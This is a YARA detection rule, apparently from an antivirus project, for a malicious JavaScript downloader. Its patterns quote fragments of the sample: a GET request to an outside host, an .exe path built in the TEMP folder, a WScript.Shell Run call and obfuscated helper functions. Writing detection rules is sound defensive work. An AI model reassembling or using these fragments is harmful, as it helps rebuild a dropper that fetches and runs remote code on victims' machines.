rule sig_20160329_d9fe0f5b9bb00080e602cb31e369d804 {
  meta:
    description = "datamaliciousorder - file 20160329_d9fe0f5b9bb00080e602cb31e369d804.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "89f1299964affe526f2a58d781da92bb702477febc67d8cc12147a565c8bdf35"

  strings:
    $s1  = "El[m](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function ZS() {return s[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"OduRu36rzxiTRQG.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[X](YH() * 11); if (El[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Nq(KT, H0){Fv = Fv * 1; return KT - H0;};" fullword ascii
    $s5  = "var s = function Su() {return WScript[k](\"WScript.Shell\");}(), P = 11;" fullword ascii
    $s6  = "function T(){return \"\" + o;};" fullword ascii
    $s7  = "function kL() {return ((Mo == true) && (Mo == a0)) ? 1 : Fv;};" fullword ascii
    $s8  = "function H(a){s[\"Run\"](a, Fv, Fv);};" fullword ascii
    $s9  = "function vq(Sk) {var Mu = (1, 2, 3, 4, 5, Sk); return Mu;};" fullword ascii
    $s10 = "function EI()" fullword ascii
    $s11 = "function YH(){return 22;};" fullword ascii
    $s12 = "return Nq(ZX, G);" fullword ascii
    $s13 = " while (Cj){" fullword ascii
    $s14 = "var vz = new this[\"Date\"]();" fullword ascii
    $s15 = "function er(){return k;};" fullword ascii
    $s16 = "var p = false;" fullword ascii
    $s17 = "a0 = true; " fullword ascii
    $s18 = "Mo = true; " fullword ascii
    $s19 = "var Mo = false;" fullword ascii
    $s20 = "var a0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}